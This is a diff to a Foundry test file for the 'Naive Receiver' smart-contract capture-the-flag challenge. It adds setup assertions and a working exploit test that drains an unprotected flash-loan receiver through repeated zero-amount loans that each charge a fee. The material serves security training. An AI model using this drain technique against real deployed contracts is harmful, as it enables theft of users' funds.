@@ -15,27 +15,31 @@ contract NaiveReceiver is Test {
     address payable internal attacker;
     address payable internal someUser;
 
+    address internal ETH;
+
     NaiveReceiverLenderPool internal nrlp;
     FlashLoanReceiver internal flr;
 
     function setUp() public {
-        console.log("setting the scene");
-        console.log("~~~~~~~~~~~~~~~~~");
+        ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+        vm.label(ETH, "ETH");
+
         Utilities utils = new Utilities();
         address[] memory actors = utils.setUp();
         deployer = payable(actors[0]);
         attacker = payable(actors[1]);
         someUser = payable(actors[2]);
 
-        console.log("our trusted dev has released the beast");
         vm.startPrank(deployer);
         nrlp = new NaiveReceiverLenderPool();
         vm.label(address(nrlp), "Pool");
         (bool sent,) = payable(nrlp).call{value: ETHER_IN_POOL}("");
         require(sent, "Failed to send Ether");
         vm.stopPrank();
-        console.log("the beast lives at %s", address(nrlp));
-        console.log("we have transferred %s to the pool to be used for flashloans", address(nrlp).balance);
+
+        assertEq(address(nrlp).balance, ETHER_IN_POOL);
+        assertEq(nrlp.maxFlashLoan(ETH), ETHER_IN_POOL);
+        assertEq(nrlp.flashFee(ETH, 0), 1e18);
 
         vm.startPrank(someUser);
         flr = new FlashLoanReceiver(address(nrlp));
@@ -43,24 +47,32 @@ contract NaiveReceiver is Test {
         (bool sent1,) = payable(flr).call{value: ETHER_IN_RECIEVER}("");
         require(sent1, "Failed to send Ether");
         vm.stopPrank();
-        console.log("you happen across a wild unprotected flashloan receiver... let's ruin their day");
+
+        assertEq(address(flr).balance, ETHER_IN_RECIEVER);
+        vm.expectRevert();
+        flr.onFlashLoan(address(deployer), ETH, ETHER_IN_RECIEVER, 1e18, "0x");
     }
 
-    function testExploit() public {
+    function test_StoryNaiveReceiver() public view {
+        console2.log("A new FlashLoan contract has been deployed!");
+        console2.log("The dev has funded the vault with 1000ETH");
+        console2.log("You come across a naive receiver");
+        console2.log("Drain the receiver");
+    }
+
+    function test_ExploitNaiveReceiever() public {
         // flr does not check that flashloan is for more than 0
         // call flashloan 10 times with 0 as entry and the receiver will be empty due to the fee
         vm.startPrank(attacker);
-        address ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
-        vm.label(ETH, "ETH");
         for (uint256 i = 0; i < 10; i++) {
             nrlp.flashLoan(flr, ETH, 0, "");
-            console.log("Calling flashloan. Current funds in receiver: %s", address(flr).balance);
         }
         vm.stopPrank();
 
         // validation
-        assertEq(0, address(flr).balance);
-        assertEq(ETHER_IN_POOL + ETHER_IN_RECIEVER, address(nrlp).balance);
-        console.log("Current funds in the beast: %s", address(nrlp).balance);
+        assertEq(address(flr).balance, 0);
+        assertEq(address(nrlp).balance,ETHER_IN_POOL + ETHER_IN_RECIEVER);
+        console2.log("Challenge complete!!");
+        console2.log("Move on to side-entrance");
     }
 }
